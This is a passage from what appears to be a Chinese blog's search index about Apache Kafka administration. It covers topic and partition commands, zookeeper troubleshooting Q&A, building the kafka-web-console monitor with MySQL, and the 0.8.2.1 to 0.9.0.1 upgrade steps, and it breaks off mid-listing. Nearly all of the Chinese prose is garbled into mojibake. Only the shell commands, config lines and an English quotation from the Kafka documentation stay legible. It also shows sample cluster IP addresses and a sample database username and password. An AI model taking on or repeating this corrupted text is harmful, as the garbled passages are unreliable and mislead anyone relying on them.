æŸ¥çœ‹topicçš„è¯¦ç»†ä¿¡æ¯ ./bin/kafka-topics.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 -describe -topic mongotail_lz4_imp3ã€ä¸ºtopicå¢åŠ partitionåˆ†åŒº å‚æ•°ï¼š--alter --partitions./bin/kafka-topics.sh --alter --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --partitions 20 --topic mongotail_lz4_imp4ã€kafkaç”Ÿäº§è€…å®¢æˆ·ç«¯å‘½ä»¤ ./bin/kafka-console-producer.sh --broker-list 75.126.39.124:9292,75.126.5.162:9292,75.126.5.178:9292 --topic mongotail_lz4_imp 5ã€kafkaæ¶ˆè´¹è€…å®¢æˆ·ç«¯å‘½ä»¤ ./bin/kafka-console-consumer.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --from-beginning --topic 6ã€kafkaæœåŠ¡å¯åŠ¨ ./kafka-server-start.sh -daemon ../config/server.properties 7ã€ä¸‹çº¿broker ./kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 127.0.0.1:2181 --broker #brokerId# --num.retries 3 --retry.interval.ms 60 shutdown broker 8ã€åˆ é™¤topic ./kafka-run-class.sh kafka.admin.DeleteTopicCommand --topic testKJ1 --zookeeper 127.0.0.1:2181 ./kafka-topics.sh --zookeeper localhost:2181 --delete --topic testKJ1 9ã€æŸ¥çœ‹consumerç»„å†…æ¶ˆè´¹çš„offset ./kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper localhost:2181 --group test --topic testKJ110ã€æŸ¥çœ‹æŸä¸ªæ¶ˆè´¹ç»„çš„æ¶ˆè´¹è¯¦æƒ…ï¼ˆæ”¯æŒ0.9ç‰ˆæœ¬+ï¼‰bin/kafka-consumer-groups.sh --new-consumer --bootstrap-server localhost:9092 --describe --group test-consumer-group11ã€æ–°æ¶ˆè´¹è€…ï¼ˆæ”¯æŒ0.9ç‰ˆæœ¬+ï¼‰bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --new-consumer --from-beginning --consumer.config config/consumer.properties Step6:Kafkaå­˜å‚¨æ¯ä¸ªreplicaä¸€ä¸ªç›®å½• 1234[jollybi@kafka1 kafka_2.10-0.8.2.0]# cd /data/tools/kafka_2.10-0.8.2.0/kafka-logs/[root@master kafka-logs]# ls__consumer_offsets-0 __consumer_offsets-20 __consumer_offsets-32 __consumer_offsets-44 my-replicatedtopic1-0__consumer_offsets-1 __consumer_offsets-21 __consumer_offsets-33 __consumer_offsets-45 my-replicated-topic1-1 äºŒçº§ç»“æ„ 123[jollybi@kafka1 kafka-logs]# cd my-replicated-topic1-0/[jollybi@kafka1 my-replicated-topic1-0]# ls00000000000000000000.index 00000000000000000000.log äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/03/28/Bigdata-hadoop/Kafka/Bigdata-Kafkaé›†ç¾¤å¿«é€Ÿæ­å»ºä¸å¢åˆ æ”¹æŸ¥å‘½ä»¤è®²è§£/"},{"title":"KafKaä¸æ‡‚å°±å­¦å°±é—®å°±è§£ç­”ç¬”è®°","text":"1. éƒ¨ç½²ç”Ÿäº§ç¯å¢ƒï¼Œæ‰“ç®—éƒ¨ç½²ä¸‰ä¸ªbrokerå®ä¾‹ï¼Œä½†zookeeperéƒ¨ç½²ä¸€ä¸ªå¯ä»¥å—?1ç­”æ¡ˆï¼šå¯ä»¥æ˜¯å¯ä»¥ï¼Œä½†ä¸ºäº†å®¹é”™è¿˜æ˜¯éƒ¨ç½²zookeeperé›†ç¾¤æ¯”è¾ƒå¥½ã€‚brokerå’Œzookeeperçš„å¯¹åº”æ¯”ä¾‹å€’æ˜¯æ²¡ä»€ä¹ˆï¼Œéƒ½æ˜¯ç‹¬ç«‹é›†ç¾¤ã€‚ 2. kafkaé›†ç¾¤ä¸ºä»€ä¹ˆéœ€è¦zookeeperæ¥é…åˆï¼Ÿ1ç­”æ¡ˆï¼šzookeeper æ˜¯ä½œä¸ºæ€§èƒ½åè°ƒå·¥å…·çš„è§’è‰²å­˜åœ¨ã€‚å­˜å‚¨ç€ä½ KafkaæœåŠ¡çš„ä¸€äº›äº›å…ƒæ•°æ®ï¼ˆpartitionsã€offsetç­‰ç­‰ï¼‰ã€‚zookeeperé›†ç¾¤çš„ä½œç”¨åœ¨äºä¿è¯ZookeeperæœåŠ¡çš„é«˜å¯ç”¨ã€‚å› æ­¤ä½ å¯ä»¥æ ¹æ®ä½ çš„éœ€è¦æ¥é€‰æ‹©æ˜¯å¦æ„å»ºzookeeperé›†ç¾¤ã€‚ 3. æŸ¥çœ‹kafka topic æ¶ˆè´¹è®°å½•æŠ¥é”™WARN Session 0x0 for server null, unexpected error, closing socket connection and attempting reconnect (org.apache.zookeeper.ClientCnxn)java.net.ConnectException: Connection timed out 123é—®é¢˜ï¼š1.æ˜¯kafkaè¿ä¸ä¸Šzookeeperäº†ã€‚è¯·æ£€æŸ¥ zk é›†ç¾¤æ˜¯å¦æ­£å¸¸èƒ½Telnetï¼Œkafkaé›†ç¾¤æ˜¯å¦æ­£å¸¸ã€‚2.æ£€æŸ¥server.properties ä¸­zookeeper.connectæ˜¯å¦é…ç½®æ­£ç¡®ï¼Œå¦‚æœéƒ½æ²¡æœ‰é—®é¢˜ï¼Œé‡æ–°å¯åŠ¨æœåŠ¡ã€‚ 4. kafka æ”¯æŒå‹ç¼©ä¼ è¾“å—ï¼Ÿ5. Kafka å¦‚ä½•åœ¨å¼€å¯æ•°æ®å‹ç¼©çš„æƒ…å†µä¸‹, consumerç»´æŠ¤è‡ªå·±çš„offset?123456789101112131415161718192021é—®é¢˜ï¼škafkaè¿™è¾¹æ•°æ®ä¼ è¾“æ¶ˆè´¹è·¨awsæœºæˆ¿è¾ƒæ…¢ã€‚ä¼šæœ‰ç½‘ç»œç“¶é¢ˆ,æˆ‘ä»¬kafkaåœ¨å›½å¤–çš„ä¸€dalasiæœºæˆ¿ï¼Œæ¶ˆè´¹ç«¯åœ¨dalasiã€‚å®˜ç½‘è§£ç­”ï¼šOffset management on the consumerThe data received by a consumer for a topic might contain both compressed as well as uncompressed messages. The consumer iterator transparently decompresses compressed data and only returns an uncompressed message. The offset maintenance in the consumer gets a little tricky. In the zookeeper consumer, the consumed offset is updated each time a message is returned. This consumed offset should be a valid fetch offset for correct failure recovery. Since data is stored in compressed format on the broker, valid fetch offsets are the compressed message boundaries. Hence, for compressed data, the consumed offset will be advanced one compressed message at a time. This has the side effect of possible duplicates in the event of a consumer failure. For uncompressed data, consumed offset will be advanced one message at a time.è¿™æ®µè¯ä¸æ˜¯å¾ˆç†è§£: producerå°†100æ¡messageå‹ç¼©æˆ1æ¡å‘ç»™brokerå, brokeræ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Œå¹¶ä¸”consumeræ˜¯å¦‚ä½•å–å‡ºè¿™å‹ç¼©åçš„æ•°æ®, å¹¶ç»´æŠ¤offsetçš„?### æ¶ˆæ¯å‹ç¼©ï¼ˆmessage compressionï¼‰è€ƒè™‘åˆ°ç½‘ç»œå¸¦å®½çš„ç“¶é¢ˆï¼ŒKafkaæä¾›äº†æ¶ˆæ¯ç»„å‹ç¼©ç‰¹æ€§ã€‚Kafkaé€šè¿‡é€’å½’æ¶ˆæ¯é›†æ¥æ”¯æŒé«˜æ•ˆå‹ç¼©ã€‚é«˜æ•ˆå‹ç¼©éœ€è¦å¤šä¸ªæ¶ˆæ¯åŒæ—¶å‹ç¼©ï¼Œè€Œä¸æ˜¯å¯¹æ¯ä¸ªæ¶ˆæ¯å•ç‹¬å‹ç¼©ã€‚ä¸€æ‰¹æ¶ˆæ¯å‹ç¼©åœ¨ä¸€èµ·å‘é€ç»™brokerã€‚å‹ç¼©æ¶ˆæ¯é›†é™ä½äº†ç½‘ç»œçš„è´Ÿè½½ï¼Œä½†æ˜¯è§£å‹ç¼©ä¹Ÿå¸¦æ¥äº†ä¸€äº›é¢å¤–çš„å¼€é”€ã€‚æ¶ˆæ¯é›†çš„è§£å‹ç¼©æ˜¯ç”±brokerå¤„ç†æ¶ˆæ¯offsetæ—¶å®Œæˆçš„ã€‚æ¯ä¸ªæ¶ˆæ¯å¯é€šè¿‡ä¸€ä¸ªä¸å¯æ¯”è¾ƒçš„ã€é€’å¢çš„é€»è¾‘offsetè®¿é—®ï¼Œè¿™ä¸ªé€»è¾‘offsetåœ¨æ¯ä¸ªåˆ†åŒºå†…æ˜¯å”¯ä¸€çš„ã€‚æ¥æ”¶åˆ°å‹ç¼©æ•°æ®åï¼Œlead brokerå°†æ¶ˆæ¯é›†è§£å‹ç¼©ï¼Œä¸ºæ¯ä¸ªæ¶ˆæ¯åˆ†é…offsetã€‚offsetåˆ†é…å®Œæˆåï¼Œleaderå†æ¬¡å°†æ¶ˆæ¯é›†å‹ç¼©å¹¶å†™å…¥ç£ç›˜ã€‚åœ¨Kafkaä¸­ï¼Œæ•°æ®çš„å‹ç¼©ç”±producerå®Œæˆï¼Œå¯ä½¿ç”¨GZIPæˆ–Snappyå‹ç¼©åè®®ã€‚åŒæ—¶éœ€è¦åœ¨producerç«¯é…ç½®ç›¸å…³çš„å‚æ•°ï¼šcompression.codecï¼šæŒ‡å®šå‹ç¼©æ ¼å¼ï¼Œé»˜è®¤ä¸ºnoneï¼Œå¯é€‰çš„å€¼è¿˜æœ‰gzipå’Œsnappyã€‚compressed.topicsï¼šè®¾ç½®å¯¹æŒ‡å®šçš„topicå¼€å¯å‹ç¼©ï¼Œé»˜è®¤ä¸ºnullã€‚å½“compression.codecä¸ä¸ºnoneæ—¶ï¼Œå¯¹æŒ‡å®šçš„topicå¼€å¯å‹ç¼©ï¼›å¦‚æœcompressed.topicsä¸ºnullåˆ™å¯¹æ‰€æœ‰topicå¼€å¯å‹ç¼©ã€‚æ¶ˆæ¯é›†ByteBufferMessageSetå¯èƒ½æ—¢åŒ…å«å‹ç¼©æ•°æ®ä¹ŸåŒ…å«éå‹ç¼©æ•°æ®ï¼Œä¸ºäº†åŒºåˆ†å¼€æ¥ï¼Œæ¶ˆæ¯å¤´ä¸­æ·»åŠ äº†å‹ç¼©å±æ€§å­—èŠ‚ã€‚åœ¨è¯¥å­—èŠ‚ä¸­ï¼Œæœ€ä½ä½çš„ä¸¤ä½è¡¨ç¤ºå‹ç¼©æ ¼å¼ï¼Œå¦‚æœéƒ½æ˜¯0è¡¨ç¤ºéå‹ç¼©æ•°æ®ã€‚ Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/09/11/Bigdata-hadoop/Kafka/KafKaä¸æ‡‚å°±å­¦å°±é—®å°±è§£ç­”ç¬”è®°/"},{"title":"Bigdata-å¼€æºçš„Kafkaé›†ç¾¤ç®¡ç†å™¨(kafka-web-console)","text":"å‰è¨€æºç çš„åœ°å€åœ¨:kafka-web-console Kafka Web Consoleä¹Ÿæ˜¯ç”¨Scalaè¯­è¨€ç¼–å†™çš„Java webç¨‹åºç”¨äºç›‘æ§Apache Kafkaã€‚è¿™ä¸ªç³»ç»Ÿçš„åŠŸèƒ½å’ŒKafkaOffsetMonitorå¾ˆç±»ä¼¼ï¼Œä½†æ˜¯æˆ‘ä»¬ä»æºç è§’åº¦æ¥çœ‹ï¼Œè¿™æ¬¾ç³»ç»Ÿå®ç°æ¯”KafkaOffsetMonitorè¦å¤æ‚å¾ˆå¤šï¼Œè€Œä¸”ç¼–è¯‘é…ç½®æ¯”KafkaOffsetMonitorè¾ƒéº»çƒ¦ã€‚ è¦æƒ³è¿è¡Œè¿™å¥—ç³»ç»Ÿæˆ‘ä»¬éœ€è¦çš„å…ˆè¡Œæ¡ä»¶ä¸ºï¼š 123Play Framework 2.2.xApache Kafka 0.8.xZookeeper 3.3.3 or 3.3.4 å…¥é—¨åŒæ ·ï¼Œæˆ‘ä»¬ä»https://github.com/claudemamo/kafka-web-consoleä¸Šé¢å°†æºç ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åç”¨sbtè¿›è¡Œç¼–è¯‘ï¼Œåœ¨ç¼–è¯‘å‰æˆ‘ä»¬éœ€è¦åšå¦‚ä¸‹çš„ä¿®æ”¹ï¼š Kafka Webæ§åˆ¶å°éœ€è¦ä¸€ä¸ªå…³ç³»æ•°æ®åº“ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨è¿æ¥åˆ°åµŒå…¥å¼H2æ•°æ®åº“ï¼Œä¸éœ€è¦æ•°æ®åº“å®‰è£…æˆ–é…ç½®ã€‚è¯·å’¨è¯¢Playï¼çš„æ–‡æ¡£ä»¥æŒ‡å®šæ§åˆ¶å°çš„æ•°æ®åº“ã€‚æ”¯æŒä»¥ä¸‹æ•°æ®åº“ï¼š 1git clone https://github.com/claudemamo/kafka-web-console.git H2ï¼ˆé»˜è®¤ï¼‰ PostgreSql Oracle DB2 MySQL Apache Derby Microsoft SQL Server ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Mysqlæ•°æ®åº“ï¼Œåªè¦åšå¦‚ä¸‹ä¿®æ”¹å³å¯ï¼Œæ‰¾åˆ° conf/application.confæ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹å¦‚ä¸‹ 123456789101112å°†è¿™ä¸ªdb.default.driver=org.h2.Driverdb.default.url=\"jdbc:h2:file:play\"# db.default.user=sa# db.default.password=\"\" ä¿®æ”¹æˆdb.default.driver=com.mysql.jdbc.Driverdb.default.url=\"jdbc:mysql://localhost:3306/kafkamonitor\"db.default.user=iteblogdb.default.pass=wyp æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹build.sbtï¼ŒåŠ å…¥å¯¹Mysqlçš„ä¾èµ–: 1\"mysql\" % \"mysql-connector-java\" % \"5.1.31\" 2ã€æ‰§è¡Œconf/evolutions/default/bakç›®å½•ä¸‹é¢çš„1.sqlã€2.sqlå’Œ3.sqlä¸‰ä¸ªæ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸‰ä¸ªsqlæ–‡ä»¶ä¸èƒ½ç›´æ¥è¿è¡Œï¼Œæœ‰è¯­æ³•é”™è¯¯ï¼Œéœ€è¦åšä¸€äº›ä¿®æ”¹ã€‚ä¸Šé¢çš„æ³¨æ„äº‹é¡¹å¼„å®Œä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¼–è¯‘ä¸‹è½½è¿‡æ¥çš„æºç ï¼š 1# sbt package ç¼–è¯‘çš„è¿‡ç¨‹æ¯”è¾ƒæ…¢ï¼Œæœ‰äº›ä¾èµ–åŒ…ä¸‹è½½é€Ÿåº¦éå¸¸åœ°æ…¢ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚ åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°æœ‰äº›ä¾èµ–åŒ…æ— æ³•ä¸‹è½½ï¼Œå¦‚ä¸‹é”™è¯¯ï¼š 123456789101112131415161718192021222324252627282930313233[warn] module not found: com.typesafe.play#sbt-plugin;2.2.1[warn] ==== typesafe-ivy-releases: tried[warn] http://repo.typesafe.com/typesafe/ivy-releases/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== sbt-plugin-releases: tried[warn] http://scalasbt.artifactoryonline.com/scalasbt/sbt-plugin-releases/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== local: tried[warn] /home/iteblog/.ivy2/local/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== Typesafe repository: tried[warn] http://repo.typesafe.com/typesafe/releases/com/typesafe/play/sbt-plugin_2.9.2_0.12/2.2.1/sbt-plugin-2.2.1.pom[warn] ==== public: tried[warn] http://repo1.maven.org/maven2/com/typesafe/play/sbt-plugin_2.9.2_0.12/2.2.1/sbt-plugin-2.2.1.pom[warn] :::::::::::::::::::::::::::::::::::::::::::::: ==== local: tried /home/iteblog/.ivy2/local/org.scala-sbt/collections/0.13.0/jars/collections.jar :::::::::::::::::::::::::::::::::::::::::::::: :: FAILED DOWNLOADS :: :: ^ see resolution messages for details ^ :: :::::::::::::::::::::::::::::::::::::::::::::: :: org.scala-sbt#collections;0.13.0!collections.jar :::::::::::::::::::::::::::::::::::::::::::::: æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åœ°ä¸‹è½½ç›¸å…³ä¾èµ–ï¼Œå¹¶æ”¾åˆ°ç±»ä¼¼/home/iteblog/.ivy2/local/org.scala-sbt/collections/0.13.0/jars/ç›®å½•ä¸‹é¢ã€‚ç„¶åå†ç¼–è¯‘å°±å¯ä»¥äº†ã€‚ æœ€åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å¯åŠ¨Kafka Web Consoleç›‘æ§ç³»ç»Ÿï¼š 1# sbt run å¹¶å¯ä»¥åœ¨http://localhost:9000 æŸ¥çœ‹ä¸‹é¢æ˜¯ä¸€å¼ æ•ˆæœå›¾ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/05/25/Bigdata-hadoop/Kafka/Bigdata-å¼€æºçš„Kafkaé›†ç¾¤ç®¡ç†å™¨(kafka-web-console)/"},{"title":"KafKaä»0.8.2.1å‡çº§åˆ°0.9.0.1å˜åŒ–æ–¹æ¡ˆä¸æ­¥éª¤","text":"ğŸŠæˆ‘è¿™é‡Œæ˜¯é‡‡ç”¨,ç¾¤é›†å‡çº§,å…¨éƒ¨æ›´æ–°åœæ­¢è€ç‰ˆæœ¬zkå’Œkafkaæ›´æ–°æœåŠ¡ã€‚ 9.0.0æœ‰æ½œåœ¨çš„ä¸­æ–­æ›´æ”¹é£é™©ï¼ˆåœ¨å‡çº§ä¹‹å‰éœ€è¦çŸ¥é“ï¼‰ï¼Œå¹¶ä¸”ä¸ä¹‹å‰ç‰ˆæœ¬çš„brokerä¹‹é—´çš„åè®®æ”¹å˜ã€‚è¿™æ„å‘³ç€æ­¤æ¬¡å‡çº§å¯èƒ½å’Œå®¢æˆ·ç«¯æ—§ç‰ˆæœ¬ä¸å…¼å®¹ã€‚å› æ­¤åœ¨å‡çº§å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå…ˆå‡çº§kafkaé›†ç¾¤ã€‚å¦‚æœä½ ä½¿ç”¨MirrorMakerä¸‹æ¸¸é›†ç¾¤ï¼Œåˆ™åŒæ ·åº”é¦–å…ˆå‡çº§ã€‚ æ»šåŠ¨å‡çº§123å‡çº§æ‰€æœ‰brokerçš„server.properties,å¹¶åœ¨å…¶ä¸­æ·»åŠ inter.broker.protocol.version = 0.8.2.Xæ¯æ¬¡å‡çº§ä¸€ä¸ªbrokerï¼šå…³é—­brokerï¼Œæ›¿æ¢æ–°ç‰ˆæœ¬ï¼Œç„¶åé‡æ–°å¯åŠ¨ã€‚ ç¾¤é›†å‡çº§ä¸€æ—¦æ•´ä¸ªç¾¤é›†å‡çº§ï¼Œé€šè¿‡ç¼–è¾‘inter.broker.protocol.versionå¹¶å°†å…¶è®¾ç½®ä¸º0.9.0.0æ¥è½¬æ¢æ‰€æœ‰åè®®ã€‚é€ä¸ªé‡æ–°å¯åŠ¨brokerï¼Œä½¿æ–°åè®®ç‰ˆæœ¬ç”Ÿæ•ˆã€‚æ³¨æ„ ï¼šå¦‚æœä½ å¯æ¥å—åœæœºï¼Œä½ å¯ä»¥ç®€å•åœ°å°†æ‰€æœ‰brokerå…³é—­ï¼Œæ›´æ–°ç‰ˆæœ¬å¹¶é‡å¯å¯åŠ¨ï¼Œåè®®å°†é»˜è®¤ä»æ–°ç‰ˆæœ¬å¼€å§‹ã€‚æ³¨æ„ ï¼šå˜æ¢åè®®ç‰ˆæœ¬å’Œé‡å¯å¯åŠ¨å¯ä»¥åœ¨brokerå‡çº§å®Œæˆåçš„ä»»ä½•æ—¶é—´å»åšï¼Œä¸å¿…é©¬ä¸Šåšã€‚ 0.9.0.0æ½œåœ¨çš„ä¸­æ–­å˜åŒ–123456789101112131415161718192021222324Java 1.6ä¸å†æ”¯æŒï¼Œéœ€è¦Jdk1.7ç‰ˆæœ¬ä»¥ä¸Šã€‚Scala 2.9ä¸å†æ”¯æŒã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ1000ä»¥ä¸Šçš„Broker IDä¸ºè‡ªåŠ¨åˆ†é…ã€‚å¦‚æœä½ çš„é›†ç¾¤é«˜äºè¯¥é˜ˆå€¼ï¼Œéœ€ç›¸åº”åœ°å¢åŠ reserved.broker.max.idé…ç½®ã€‚replica.lag.max.messagesé…ç½®å·²ç»ç§»é™¤ã€‚åˆ†åŒºleaderåœ¨å†³å®šå“ªäº›å‰¯æœ¬å¤„äºåŒæ­¥æ—¶å°†ä¸å†è€ƒè™‘è½åçš„æ¶ˆæ¯çš„æ•°ã€‚é…ç½®å‚æ•°replica.lag.time.max.msç°åœ¨ä¸ä»…æŒ‡è‡ªä¸Šæ¬¡ä»å‰¯æœ¬è·å–è¯·æ±‚åç»è¿‡çš„æ—¶é—´ï¼Œè¿˜æŒ‡è‡ªå‰¯æœ¬ä¸Šæ¬¡è¢«æ•è·ä»¥æ¥çš„æ—¶é—´ã€‚ å‰¯æœ¬ä»ç„¶ä»leaderè·å–æ¶ˆæ¯ï¼Œä½†è¶…è¿‡replica.lag.time.max.msé…ç½®çš„æœ€æ–°æ¶ˆæ¯å°†è¢«è®¤ä¸ºä¸åŒæ­¥çš„ã€‚å‹ç¼©çš„topicä¸å†æ¥å—æ²¡æœ‰keyçš„æ¶ˆæ¯ï¼Œå¦‚æœå‡ºç°ï¼Œç”Ÿäº§è€…å°†æŠ›å‡ºå¼‚å¸¸ã€‚ åœ¨0.8.xä¸­ï¼Œæ²¡æœ‰keyçš„æ¶ˆæ¯å°†å¯¼è‡´æ—¥å¿—å‹ç¼©çº¿ç¨‹é€€å‡ºï¼ˆå¹¶åœæ­¢æ‰€æœ‰å‹ç¼©çš„topicï¼‰ã€‚MirrorMakerä¸å†æ”¯æŒå¤šä¸ªç›®æ ‡é›†ç¾¤ã€‚ å®ƒåªæ¥å—ä¸€ä¸ª--consumer.configã€‚ è¦é•œåƒå¤šä¸ªæºé›†ç¾¤ï¼Œæ¯ä¸ªæºé›†ç¾¤è‡³å°‘éœ€è¦ä¸€ä¸ªMirrorMakerå®ä¾‹ï¼Œæ¯ä¸ªæºé›†ç¾¤éƒ½æœ‰è‡ªå·±çš„æ¶ˆè´¹è€…é…ç½®ã€‚åœ¨org.apache.kafka.clients.toolsã€‚åŒ…ä¸‹çš„Toolså·²ç§»è‡³org.apache.kafka.toolsã€‚ã€‚ æ‰€æœ‰åŒ…å«çš„è„šæœ¬ä»å°†ç…§å¸¸å·¥ä½œï¼Œåªæœ‰ç›´æ¥å¯¼å…¥è¿™äº›ç±»çš„è‡ªå®šä¹‰ä»£ç å°†å—åˆ°å½±å“ã€‚åœ¨kafka-run-class.shä¸­æ›´æ”¹äº†é»˜è®¤çš„Kafka JVMæ€§èƒ½é€‰é¡¹ï¼ˆKAFKA_JVM_PERFORMANCE_OPTSï¼‰ã€‚kafka-topics.shè„šæœ¬ï¼ˆkafka.admin.TopicCommandï¼‰ç°åœ¨é€€å‡ºï¼Œå¤±è´¥æ—¶å‡ºç°éé›¶é€€å‡ºä»£ç ã€‚kafka-topics.shè„šæœ¬ï¼ˆkafka.admin.TopicCommandï¼‰ç°åœ¨å°†åœ¨topicåç§°ç”±äºä½¿ç”¨â€œ.â€æˆ–â€œ_â€è€Œå¯¼è‡´é£é™©åº¦é‡æ ‡å‡†å†²çªæ—¶æ‰“å°è­¦å‘Šã€‚ä»¥åŠå†²çªçš„æƒ…å†µä¸‹çš„é”™è¯¯ã€‚kafka-console-producer.shè„šæœ¬ï¼ˆkafka.tools.ConsoleProducerï¼‰å°†é»˜è®¤ä½¿ç”¨æ–°çš„Java Producerï¼Œç”¨æˆ·å¿…é¡»æŒ‡å®šâ€œold-producerâ€æ‰èƒ½ä½¿ç”¨æ—§ç”Ÿäº§è€…ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å‘½ä»¤è¡Œå·¥å…·éƒ½ä¼šå°†æ‰€æœ‰æ—¥å¿—æ¶ˆæ¯æ‰“å°åˆ°stderrè€Œä¸æ˜¯stdoutã€‚ 0.9.0.1ä¸­çš„æ˜¾è‘—å˜åŒ–123456å¯ä»¥é€šè¿‡å°†broker.id.generation.enableè®¾ç½®ä¸ºfalseæ¥ç¦ç”¨æ–°çš„broker IDç”ŸæˆåŠŸèƒ½ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé…ç½®å‚æ•°log.cleaner.enableä¸ºtrueã€‚ è¿™æ„å‘³ç€topicä¼šæ¸…ç†ã€‚policy = compactç°åœ¨å°†è¢«é»˜è®¤å‹ç¼©ï¼Œå¹¶ä¸”128MBçš„å †ï¼ˆé€šè¿‡log.cleaner.dedupe.buffer.sizeï¼‰åˆ†é…ç»™æ¸…æ´—è¿›ç¨‹ã€‚ä½ å¯èƒ½éœ€è¦æ ¹æ®ä½ å¯¹å‹ç¼©topicçš„ä½¿ç”¨æƒ…å†µï¼ŒæŸ¥çœ‹log.cleaner.dedupe.buffer.sizeå’Œå…¶ä»–log.cleaneré…ç½®å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–°æ¶ˆè´¹è€…çš„é…ç½®å‚æ•°fetch.min.bytesçš„é»˜è®¤å€¼ä¸º1ã€‚ 0.9.0.0å¼ƒç”¨çš„1234567kafka-topics.shè„šæœ¬çš„å˜æ›´topicé…ç½®å·²å¼ƒç”¨ï¼ˆkafka.admin.ConfigCommandï¼‰ï¼Œä»¥åå°†ä½¿ç”¨kafka-configs.sh(kafka.admin.ConfigCommand) ã€‚kafka-consumer-offset-checker.sh(kafka.tools.ConsumerOffsetChecker)å·²å¼ƒç”¨ï¼Œä»¥åå°†ä½¿ç”¨kafka-consumer-groups.sh (kafka.admin.ConsumerGroupCommand)kafka.tools.ProducerPerformanceå·²å¼ƒç”¨ã€‚ä»¥åå°†ä½¿ç”¨org.apache.kafka.tools.ProducerPerformanceï¼ˆkafka-producer-perf-test.shä¹Ÿå°†ä½¿ç”¨æ–°ç±»ï¼‰ç”Ÿäº§è€…çš„block.on.buffer.fullå·²å¼ƒç”¨ï¼Œå¹¶å°†åœ¨ä»¥åçš„ç‰ˆæœ¬ä¸­ç§»é™¤ã€‚ç›®å‰å…¶é»˜è®¤å·²ç»æ›´ä¸ºfalseã€‚KafkaProducerå°†ä¸å†æŠ›å‡ºBufferExhaustedExceptionï¼Œè€Œæ˜¯ä½¿ç”¨max.block.msæ¥ä¸­æ­¢ï¼Œä¹‹åå°†æŠ›å‡ºTimeoutExceptionã€‚å¦‚æœblock.on.buffer.fullå±æ€§æ˜ç¡®åœ°è®¾ç½®ä¸ºtrueï¼Œå®ƒå°†è®¾ç½®max.block.msä¸ºLong.MAX_VALUEå’Œmetadata.fetch.timeout.mså°†ä¸æ‰§è¡Œã€‚ å‡çº§å‡†å¤‡æ­¥éª¤ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667ï¼ˆ0ï¼‰wget http://mirror.bit.edu.cn/apache/kafka/0.9.0.1/kafka_2.10-0.9.0.1.tgztar -xvf kafka_2.10-0.9.0.1.tgz[jollybi@kafka1 tools]$ lltotal 88100drwxr-xr-x 7 jollybi jollybi 4096 Jul 14 13:07 kafka_2.10-0.8.2.1-rw-rw-r-- 1 jollybi jollybi 16162559 Jul 14 11:40 kafka_2.10-0.8.2.1.tgzdrwxr-xr-x 6 jollybi jollybi 4096 Feb 12 2016 kafka_2.10-0.9.0.1-rw-rw-r-- 1 